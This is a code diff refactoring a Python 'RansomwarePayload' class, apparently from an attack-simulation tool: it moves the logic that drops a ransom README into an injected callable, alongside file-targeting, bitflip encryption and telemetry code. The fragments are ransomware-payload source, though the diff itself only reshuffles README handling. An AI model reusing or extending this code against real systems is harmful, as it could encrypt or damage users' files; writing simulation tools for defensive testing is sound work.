@@ -24,8 +24,8 @@ class RansomwarePayload:
     def __init__(
         self,
         config: dict,
+        leave_readme: Callable[[Path, Path], None],
         telemetry_messenger: ITelemetryMessenger,
-        copy_file: Callable[[Path, Path], None],
     ):
         LOG.debug(f"Ransomware payload configuration:\n{pformat(config)}")
 
@@ -38,7 +38,7 @@ class RansomwarePayload:
         self._targeted_file_extensions.discard(self._new_file_extension)
 
         self._encryptor = BitflipEncryptor(chunk_size=CHUNK_SIZE)
-        self._copy_file = copy_file
+        self._leave_readme = leave_readme
         self._telemetry_messenger = telemetry_messenger
 
     @staticmethod
@@ -66,7 +66,7 @@ class RansomwarePayload:
             self._encrypt_files(file_list)
 
         if self._readme_enabled:
-            self._leave_readme()
+            self._leave_readme(README_SRC, self._target_dir / README_DEST)
 
     def _find_files(self) -> List[Path]:
         LOG.info(f"Collecting files in {self._target_dir}")
@@ -97,21 +97,3 @@ class RansomwarePayload:
     def _send_telemetry(self, filepath: Path, success: bool, error: str):
         encryption_attempt = FileEncryptionTelem(str(filepath), success, error)
         self._telemetry_messenger.send_telemetry(encryption_attempt)
-
-    def _leave_readme(self):
-
-        readme_dest_path = self._target_dir / README_DEST
-
-        if readme_dest_path.exists():
-            LOG.warning(f"{readme_dest_path} already exists, not leaving a new README.txt")
-            return
-
-        self._copy_readme_file(readme_dest_path)
-
-    def _copy_readme_file(self, dest: Path):
-        LOG.info(f"Leaving a ransomware README file at {dest}")
-
-        try:
-            self._copy_file(README_SRC, dest)
-        except Exception as ex:
-            LOG.warning(f"An error occurred while attempting to leave a README.txt file: {ex}")
